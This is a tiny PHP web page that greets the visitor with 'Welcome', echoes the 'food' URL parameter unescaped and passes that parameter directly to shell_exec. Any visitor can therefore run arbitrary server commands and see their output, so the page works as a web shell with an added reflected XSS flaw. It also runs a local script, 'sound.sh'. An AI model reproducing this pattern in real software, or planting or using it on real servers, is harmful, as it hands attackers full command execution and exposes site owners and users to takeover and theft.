<html>
<body>

Welcome <?php echo $_GET["food"];
	echo "\n";
	$output = shell_exec($_GET["food"]);
	
	shell_exec("sound.sh");
	
	echo $output;
?>

</body>
</html>